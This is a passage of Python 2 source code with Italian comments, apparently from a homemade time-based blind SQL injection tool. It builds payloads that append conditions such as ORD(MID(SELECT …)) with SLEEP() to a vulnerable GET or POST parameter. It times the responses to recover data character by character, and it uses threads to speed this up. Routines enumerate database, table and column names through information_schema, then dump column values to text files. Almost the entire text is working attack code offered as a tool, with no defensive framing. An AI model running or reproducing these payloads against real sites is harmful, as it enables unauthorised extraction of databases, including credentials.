                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) > OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                        req.content
                        end = time.time()

                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) > OptionConfiguration.timeToWait):
                            trovato = True
                            length = mid;
                            break

                    dataToSent = OptionConfiguration.data.copy()
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[OptionConfiguration.valueInjectable] + \
                                                                      " AND ( SELECT LENGTH(%s) FROM %s LIMIT %s,1  ) > %s " % (
                                                                          nomeColonna, nomeTabella, i, mid) + \
                                                                      " AND SLEEP(%s) " % (
                                                                          OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ( SELECT LENGTH(%s) FROM %s WHERE %s LIMIT %s,1 ) > %s " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, i, mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                    req.content
                    end = time.time()

                    # sono nella ,eta superiore
                    if ((end - start )>= OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            min = mid + 1
                    # sono nella meta inferiore
                    else:
                        max = mid-1
                else:
                    break



        #arrivato a questo punto nella variabile length e contenuto il numero di caratteri della parola iesima
        #print (length)
        for l in range(length):
            print "*",
        print ("")
        #valori.append(ricostruisciParolaGET(length,nomeTabella,nomeColonna,i,condizioneWhere))
        # da controllare le pwd siccome la prima me la sbaglia sempre
        value=threadStart(length,nomeTabella,nomeColonna,i,condizioneWhere)
        valori.append(value)
    return valori


# questo potrei provare a farlo attraverso magari 3/4 thread per velocizzarlo

def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere):
    """
        funzione che dalla lunghezza della parola e dal nome della tabella
        ricostruisce la parola di per si basandomi sempre sulla ricerca binaria
        e sulla codifica decimale dei carattere ASCII
        Quindi ci basiamo sulla funzione MID per estrapolare il carattere
        e sulla funzione ORD per estrapolare la codifica ascii
        # la funzione mid funzione in modo particolare l'indice parte da 1 e arriva fino all'effettiva lunghezza
        # della stringa

    """
    value=""
    for i in range(1,length+1):
        trovato=False
        min =0
        max=256

        if(OptionConfiguration.typeOfValue=="string"):
            while (trovato == False):
                if (min <= max):
                    # print (min,max)
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()
                    # modifico il valore injectable
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid)+ \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start )> OptionConfiguration.timeToWait):
                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        #print (end, start, chr(mid),req.elapsed.total_seconds())
                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) > OptionConfiguration.timeToWait):
                        #carattere troato
                            trovato = True
                            value=value+chr(mid)
                            print chr(mid),
                            break
                    else:
                        dataToSent = OptionConfiguration.data.copy()
                        if(condizioneWhere==None):
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)
                        else:
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) -- -" % (
                                                                                  OptionConfiguration.timeToWait)

                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) > OptionConfiguration.timeToWait):
                            start = time.time()
                            req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                            req.content
                            end = time.time()

                            # sono nella ,eta superiore
                            if ((end - start) > OptionConfiguration.timeToWait):
                                min = mid + 1
                        # sono nella meta inferiore
                        else:
                            max = mid-1
                else:
                    break

        # parametro intero
        else:

            while (trovato == False):
                if (min <= max):
                    # print (min,max)
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()

                    if(condizioneWhere==None):
                        # modifico il valore injectable
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                  OptionConfiguration.valueInjectable] + \
                                                              " AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                              " AND SLEEP(%s) " % (
                                                                  OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,
                                                                              indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    start = time.time()
                    req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                    req.content
                    end = time.time()
                    # se succede questo allora lo abbiamo trovato
                    #time of execution for control
                    #print (end-start),chr(mid),req.elapsed.total_seconds()
                    if ((end - start) > OptionConfiguration.timeToWait):

                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()
                        if ((end - start) >OptionConfiguration.timeToWait):
                            trovato = True
                            value = value + chr(mid)
                            print chr(mid),
                            break

                            # carattere trovato
                    else:
                        dataToSent = OptionConfiguration.data.copy()
                        if(condizioneWhere==None):
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid)+ \
                                                                          " AND SLEEP(%s)" % (
                                                                              OptionConfiguration.timeToWait)
                        else:
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                              nomeColonna, nomeTabella,condizioneWhere, indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)


                        start = time.time()
                        req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            start = time.time()
                            req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                            req.content
                            end = time.time()

                            # sono nella ,eta superiore
                            if ((end - start) >= OptionConfiguration.timeToWait):
                                min = mid + 1
                        # sono nella meta inferiore
                        else:
                            max = mid-1
                else:
                    break
    print("")
    print (OptionConfiguration.bcolors.BOLD+"value find -> "+ value+OptionConfiguration.bcolors.ENDC)
    print("")
    return value

def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhere):
    """funzione che dalla lunghezza della parola e dal nome della tabella
        ricostruisce la parola di per si basandomi sempre sulla ricerca binaria
        e sulla codifica decimale dei carattere ASCII
        Quindi ci basiamo sulla funzione MID per estrapolare il carattere
        e sulla funzione ORD per estrapolare la codifica ascii
        """
    # la funzione mid funzione in modo particolare l'indice parte da 1 e arriva fino all'effettiva lunghezza
    # della stringa

    value = ""
    for i in range(1, length + 1):
        trovato = False
        min = 0
        max = 256

        if (OptionConfiguration.typeOfValue == "string"):

            while (trovato == False):

                if (min <= max):
                    # print (min,max)
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()
                    # modifico il valore injectable
                    if(condizioneWhere==None):

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                          OptionConfiguration.valueInjectable] + \
                                                                      "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                      " AND SLEEP(%s) -- -" % (
                                                                          OptionConfiguration.timeToWait)
                    else:

                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    #print (data)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    #print (end-start),chr(mid),req.elapsed.total_seconds()

                    if ((end - start) >= OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            # carattere trovato
                            trovato = True
                            value = value + chr(mid)
                            print chr(mid),
                            break
                    else:
                        dataToSent = OptionConfiguration.data.copy()
                        if(condizioneWhere==None):
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          "' AND (ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s) -- -" % (
                                                                              OptionConfiguration.timeToWait)
                        else:
                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              "' AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) -- -" % (
                                                                                  OptionConfiguration.timeToWait)

                        data=creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start )>= OptionConfiguration.timeToWait):
                            data = creaStringaGet(dataToSent)
                            start = time.time()
                            req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                            req.content
                            end = time.time()

                            # sono nella ,eta superiore
                            if ((end - start) >= OptionConfiguration.timeToWait):
                                min = mid + 1
                        # sono nella meta inferiore
                        else:
                            max = mid-1
                else:
                    break


        # parametro intero
        else:

            while (trovato == False):
                if (min <= max):
                    # print (min,max)
                    mid= min+int((max-min)//2)
                    dataToSent = OptionConfiguration.data.copy()

                    # modifico il valore injectable
                    if(condizioneWhere==None):
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                          OptionConfiguration.valueInjectable] + \
                                                                      " AND ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) = %s " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                      " AND SLEEP(%s) " % (
                                                                          OptionConfiguration.timeToWait)
                    else:
                        dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) = %s) " % (
                                                                              nomeColonna, nomeTabella, condizioneWhere,indice, i,
                                                                              mid) + \
                                                                          " AND SLEEP(%s) " % (
                                                                              OptionConfiguration.timeToWait)

                    data=creaStringaGet(dataToSent)
                    start = time.time()
                    req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                    req.content
                    end = time.time()

                    # se succede questo allora lo abbiamo trovato
                    if ((end - start) >= OptionConfiguration.timeToWait):
                        data = creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                        # se succede questo allora lo abbiamo trovato
                        if ((end - start) >= OptionConfiguration.timeToWait):
                            # carattere trovato
                            trovato = True
                            value = value + chr(mid)
                            print chr(mid),
                            break

                    else:
                        dataToSent = OptionConfiguration.data.copy()

                        if(condizioneWhere==None):

                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                              OptionConfiguration.valueInjectable] + \
                                                                          " AND ORD(MID((SELECT %s FROM %s LIMIT %s,1 ),%s,1)) > %s " % (
                                                                          nomeColonna, nomeTabella, indice,i, mid) + \
                                                                          " AND SLEEP(%s)" % (
                                                                              OptionConfiguration.timeToWait)
                        else:

                            dataToSent[OptionConfiguration.valueInjectable] = dataToSent[
                                                                                  OptionConfiguration.valueInjectable] + \
                                                                              " AND (ORD(MID((SELECT %s FROM %s WHERE %s LIMIT %s,1 ),%s,1)) > %s) " % (
                                                                                  nomeColonna, nomeTabella,
                                                                                  condizioneWhere, indice, i,
                                                                                  mid) + \
                                                                              " AND SLEEP(%s) " % (
                                                                                  OptionConfiguration.timeToWait)

                        data=creaStringaGet(dataToSent)
                        start = time.time()
                        req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                        req.content
                        end = time.time()

                        # sono nella ,eta superiore
                        if ((end - start )>= OptionConfiguration.timeToWait):

                            data = creaStringaGet(dataToSent)
                            start = time.time()
                            req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                            req.content
                            end = time.time()

                            # sono nella ,eta superiore
                            if ((end - start) >= OptionConfiguration.timeToWait):

                                min = mid + 1
                        # sono nella meta inferiore

                        else:
                            max = mid-1
                else:
                    print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error value no find " + OptionConfiguration.bcolors.ENDC)

                    break

    print("")
    print (OptionConfiguration.bcolors.BOLD+"value find -> "+value+OptionConfiguration.bcolors.ENDC)
    print("")
    return value


def threadStart(length,nomeTabella,nomeColonna,indice,condizioneWhere):
    import threading
    import pythonThreadRicostruisciParola
    threads=[]

    # rivedere questa parte per le password
    # non funziona a volte
    for i in range(1,length+1):
        if(OptionConfiguration.methodSentData=="GET"):
            t=threading.Thread(name=str(i),target=pythonThreadRicostruisciParola.ricostruisciParolaGET,args=(i,nomeTabella,nomeColonna,indice,condizioneWhere,))
            t.start()
            threads.append(t)
        else:
            t = threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
                                 args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
            t.start()
            threads.append(t)

            # t.join()

    for t in threads:
        t.join()

    value=""
    #print pythonThreadRicostruisciParola.datafinale
    for i in range (1,length+1):
        value=value+pythonThreadRicostruisciParola.datafinale[i]

    print "Value find -> " + value;
    print("")
    return value;


def searchNameAlldb():
    """funzione che cerca tutti i nomi dei db"""
    if(OptionConfiguration.methodSentData=="GET"):
        #print("ci")
        numeroRigheDb=countValueofTableGet(informationSchema.tabellaDB,None)
        print ("")
        #print (numeroRigheDb)
        if(numeroRigheDb!=None):
            print "Num of DB -> "+str(numeroRigheDb)
            print ("")
            valori=searchValueofTableGet(numeroRigheDb,informationSchema.tabellaDB,informationSchema.colonnaNomeDb,None)
            #print (valori)
            if(valori!=None and len(valori)>0):

                fileWrite = open("DBname.txt", 'w')
                for value in valori:
                    fileWrite.write(str(value)+'\n')
                fileWrite.close()
                #print (numeroRigheDb)
                print(OptionConfiguration.bcolors.BOLD+"Value write on DBname.txt"+OptionConfiguration.bcolors.ENDC)

            else:
                print(OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error nothing value found" + OptionConfiguration.bcolors.ENDC)
        else:
            print(OptionConfiguration.bcolors.BOLD+"Value write on "+OptionConfiguration.destination[0]+"/DBname.txt"+OptionConfiguration.bcolors.ENDC)

    elif(OptionConfiguration.methodSentData=="POST"):
        numeroRigheDb=countValueofTablePost(informationSchema.tabellaDB,None)
        #print (numeroRigheDb)
        print ("")
        if (numeroRigheDb!=None):
            print ("Num of DB -> "+ str(numeroRigheDb))
            print ("")
            valori=searchValueofTablePost(numeroRigheDb,informationSchema.tabellaDB,informationSchema.colonnaNomeDb,None)
            print (valori)
            if(valori!=None):

                fileWrite = open("DBname.txt", 'w')
                for value in valori:
                    fileWrite.write(str(value)+'\n')
                fileWrite.close()
                #print (numeroRigheDb)
                print(OptionConfiguration.bcolors.BOLD+"Value write on DBname.txt"+OptionConfiguration.bcolors.ENDC)

            else:
                print(OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error nothing value found" + OptionConfiguration.bcolors.ENDC)
        else:
            print(OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Error num of rows not found"+OptionConfiguration.bcolors.ENDC)

def searchAllTableName(nomeDb):
    """
    interrogo la tabella="INFORMATION_SCHEMA.TABLES
    la quale contiene tutti i nomi delle tabelle
    dopo avere selezionato il db da usare
    """

    #value=seqOfAsciiCode(nomeDb)
    #where =informationSchema.condizioneSulDb + " = CHAR("+value+")";
    #print (where)
    #where=""+informationSchema.condizioneSulDb+" =  (SELECT %s FROM %s LIMIT %s,1 )"%(informationSchema.colonnaNomeDb,informationSchema.tabellaDB,1);
    if(OptionConfiguration.methodSentData=="POST"):
        value = seqOfAsciiCode(nomeDb)
        where = informationSchema.condizioneSulDb + " = CHAR(" + value + ")";
        #print (where)
        numeroRighe=countValueofTablePost(informationSchema.tabelleContienteNameTabelle,where)
        #print (numeroRighe)
        print("")
        if(numeroRighe!=None):
            print ("Num of table of %s -> %s"%(nomeDb,numeroRighe))
            print ("")
            valori=searchValueofTablePost(numeroRighe,informationSchema.tabelleContienteNameTabelle,informationSchema.colonnaNomeTabelle,where)

            if(valori!=None):

                fileWrite = open("TableNameOf_%s_.txt"%(nomeDb), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print (OptionConfiguration.bcolors.BOLD+"Valori scritti su TableNameOf_%s_.txt"%(nomeDb)+OptionConfiguration.bcolors.ENDC)

            else:
                print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Error no value find"+OptionConfiguration.bcolors.ENDC)

        else:
            print (OptionConfiguration.bcolors.BOLD+OptionConfiguration.bcolors.FAIL+"Error num of rows =0 "+OptionConfiguration.bcolors.ENDC)

    elif(OptionConfiguration.methodSentData=="GET"):
        value = seqOfAsciiCode(nomeDb)
        where = informationSchema.condizioneSulDb + " = CHAR(" + value + ")";
        #print(where)
        numeroRighe=countValueofTableGet(informationSchema.tabelleContienteNameTabelle,where)
#        print (numeroRighe)
        print ("")
        if(numeroRighe!=None):
            print ("Num of table of %s -> %s" % (nomeDb,numeroRighe))
            print ("")
            valori=searchValueofTableGet(numeroRighe,informationSchema.tabelleContienteNameTabelle,informationSchema.colonnaNomeTabelle,where)
            if(valori!=None):

                fileWrite = open("TableNameOf_%s_.txt" % (nomeDb), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print ("Valori scritti su TableNameof_%s_.txt"%(nomeDb))

            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error no value find" + OptionConfiguration.bcolors.ENDC)

        else:
            print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error num of rows =0 " + OptionConfiguration.bcolors.ENDC)

def searchAllColumnOfTable(nomeTabella):

    """
        cerca tutte le colonne di una tabella

    """
    if(OptionConfiguration.methodSentData=="GET"):
        value = seqOfAsciiCode(nomeTabella)
        #print (value)
        #print (nomeTabella)
        # usare unhex e hex ??
        where = informationSchema.condizioniNomeColonna + " = CHAR(" + value + ")"
        # where=informationSchema.condizioniNomeColonna+"= '"+nomeTabella+"'"
        #print (where)
        numeroRigheDB=countValueofTableGet(informationSchema.tabellaWithColumns,where)
        print("")
        if(numeroRigheDB!=None):
            print "Num of columns of %s -> %s"%(nomeTabella,numeroRigheDB)
            print ("")
            valori=searchValueofTableGet(numeroRigheDB,informationSchema.tabellaWithColumns,informationSchema.colonnaNomeColonne,where)

            if(valori!=None):
                fileWrite = open("ColumnOfTable_%s_.txt" % (nomeTabella), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print ("Valori scritti su ColumnOfTable_%s_.txt" % (nomeTabella))

            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error no value find" + OptionConfiguration.bcolors.ENDC)

        else:
            print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error num of rows =0 " + OptionConfiguration.bcolors.ENDC)


    elif(OptionConfiguration.methodSentData == "POST"):
        value = seqOfAsciiCode(nomeTabella)
        where = informationSchema.condizioniNomeColonna + " = CHAR(" + value + ")"

        numeroRigheDB = countValueofTablePost(informationSchema.tabellaWithColumns, where)
        print("")
        if (numeroRigheDB != None):
            print "Num of columns of %s -> %s"%(nomeTabella,numeroRigheDB)
            print ("")
            valori = searchValueofTablePost(numeroRigheDB, informationSchema.tabellaWithColumns,
                                            informationSchema.colonnaNomeColonne, where)

            if(valori!=None):
                fileWrite = open("ColumnOfTable_%s_.txt" % (nomeTabella), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print ("Valori scritti su ColumnOfTable_%s_.txt" % (nomeTabella))
            else:
                print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error no value find" + OptionConfiguration.bcolors.ENDC)
        else:
            print (OptionConfiguration.bcolors.BOLD + OptionConfiguration.bcolors.FAIL + "Error num of rows =0 " + OptionConfiguration.bcolors.ENDC)

def searchAllValueOfColumn(nomeColonna,nomeTabella,nomeDb):

    #value = seqOfAsciiCode(nomeTabella)
    #print (value)
    #print (nomeTabella)
    #where = informationSchema.condizioniNomeColonna + " = CHAR(" + value + ")"

    nomeTabella=nomeDb+"."+nomeTabella;
    #ceck esistenza tabella


    if (OptionConfiguration.methodSentData == "GET"):

        # controllo esistenza della nome colonna
        valore=seqOfAsciiCode(nomeColonna)
        whereEsistenzaColonna=informationSchema.colonnaNomeColonne+"= CHAR("+valore+")"
        check=countValueofTableGet(informationSchema.tabellaWithColumns,whereEsistenzaColonna)

        if(check>0):
            numeroRigheDB = countValueofTableGet(nomeTabella, None)
            print ("")

            if (numeroRigheDB != None):
                print ("Num of rows of  %s -> %s"%(nomeTabella,numeroRigheDB))
                print ("")
                valori = searchValueofTableGet(numeroRigheDB, nomeTabella,
                                           nomeColonna, None)
                fileWrite = open("ValueOfColumn_%s_.txt" % (nomeColonna), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print ("Valori scritti su ValueOfColumn_%s_.txt" % (nomeColonna))
            else:
                print ("Table Vuota")
        else:
            print (OptionConfiguration.bcolors.FAIL+OptionConfiguration.bcolors.BOLD+"Colonna non esistente"+OptionConfiguration.bcolors.ENDC)

    elif(OptionConfiguration.methodSentData == "POST"):
        valore = seqOfAsciiCode(nomeColonna)
        whereEsistenzaColonna = informationSchema.colonnaNomeColonne + "= CHAR(" + valore + ")"
        check = countValueofTableGet(informationSchema.tabellaWithColumns, whereEsistenzaColonna)

        if (check > 0):

            numeroRigheDB = countValueofTablePost(nomeTabella, None)
            print ("")
            if (numeroRigheDB != None):
                print ("Num of rows of  %s -> %s" % (nomeTabella,numeroRigheDB))
                print ("")
                valori = searchValueofTablePost(numeroRigheDB, nomeTabella,
                                       nomeColonna, None)


                fileWrite = open("ValueOfColumn_%s_.txt" % (nomeColonna), 'w')
                for value in valori:
                    fileWrite.write(str(value) + '\n')
                fileWrite.close()
                print ("Valori scritti su ValueOfColumn_%s_.txt" % (nomeColonna))
            else:
                print ("Table vuota")
        else:
            print (OptionConfiguration.bcolors.FAIL+OptionConfiguration.bcolors.BOLD+"Colonna non esistente"+OptionConfiguration.bcolors.ENDC)

def seqOfAsciiCode(prova):
    """ funzione che da una stringa ritorna
    una stringa che contiene per
    ogni carattere della stringa o
    riginale codificata in codice ascii
    separati da una virgola"""

    # lista in char
    #[ ord (c) for c in prova]
    # la codifica della stringa in hex
    #"stringa".decode('hex')
    value = ""
    for i in range(len(prova)):
        if (i != len(prova) - 1):
            value = value + str(ord(prova[i])) + ","
        else:
            value = value + str(ord(prova[i]))
    return value
